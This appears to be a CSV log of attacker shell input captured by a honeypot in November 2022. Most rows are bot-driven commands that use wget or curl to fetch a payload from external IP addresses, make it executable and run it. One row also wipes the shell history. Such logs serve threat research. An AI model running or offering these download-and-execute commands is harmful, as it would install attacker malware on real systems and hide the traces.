id,session,timestamp,realm,input
1,3c4cc4476254,2022-11-15T15:22:02.859197Z,,"#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://23.235.171.196:88/112; curl -O http://23.235.171.196:88/112; chmod +x 112; ./112; rm -rf 123.sh; history -c; "
2,3c4cc4476254,2022-11-15T15:23:20.948593Z,,/bin/eyshcjdmzg
3,3c4cc4476254,2022-11-15T15:23:20.947688Z,,/bin/eyshcjdmzg
4,3c4cc4476254,2022-11-15T15:23:21.347155Z,,"ls -la /var/run/gcc.pid"
5,3f8e66641459,2022-11-15T15:25:46.947938Z,,ls
6,3f8e66641459,2022-11-15T15:25:51.366225Z,,"uname -a"
7,ac464d3773f4,2022-11-15T17:02:19.413443Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
8,5415aea8ef8f,2022-11-15T17:03:43.229914Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
9,ee7ea851988a,2022-11-15T17:05:22.613580Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
10,d359f1efa03b,2022-11-15T17:06:34.534586Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
11,09e367e357b8,2022-11-15T17:06:48.761435Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
12,d17d2d9fd1a4,2022-11-15T17:07:31.412433Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
13,868d48083c37,2022-11-15T17:07:45.441092Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
14,de0366721819,2022-11-15T17:08:00.177423Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
15,976c66a30f54,2022-11-15T17:08:58.958535Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
16,9ee0a527a7aa,2022-11-15T17:09:13.484043Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
17,c66f0b124cf1,2022-11-15T17:09:27.917955Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
18,f6c8c1d62ab8,2022-11-15T17:10:25.386665Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
19,f6ff08845dd5,2022-11-15T17:11:08.813974Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
20,dfc7b1a1681c,2022-11-15T18:02:26.773962Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
21,f09dce22653b,2022-11-15T18:03:49.548077Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
22,7195cec865d5,2022-11-15T18:05:27.163559Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
23,18449fd1ea5b,2022-11-15T18:06:38.112800Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
24,e2f9a98de51d,2022-11-15T18:06:52.500177Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
25,b110e0744487,2022-11-15T18:07:35.196808Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
26,1017e7d4bd78,2022-11-15T18:07:49.130864Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
27,7713f796fdc6,2022-11-15T18:08:03.481340Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
28,5678164bcf93,2022-11-15T18:09:02.382669Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
29,0158cdd73058,2022-11-15T18:09:16.972986Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
